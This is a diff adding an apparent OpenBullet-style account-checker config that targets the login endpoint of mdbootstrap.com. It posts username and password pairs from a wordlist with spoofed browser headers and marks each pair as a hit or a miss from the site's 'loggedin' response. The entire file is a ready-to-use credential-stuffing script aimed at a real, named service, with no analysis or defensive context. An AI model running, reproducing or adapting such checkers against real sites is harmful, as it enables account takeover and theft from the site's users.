@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "MaterialDesign",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-11T20:25:30.6573556+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://mdbootstrap.com/wp-admin/admin-ajax.php" AutoRedirect=TRUE 
+  CONTENT "action=ajaxlogin&name=&username=<USER>&password=<PASS>&security=da49ce1a7c" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://mdbootstrap.com" 
+  HEADER "Referer: https://mdbootstrap.com/secret-login/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"loggedin\":false" 
+  KEYCHAIN Success OR 
+    KEY "{\"loggedin\":true" 
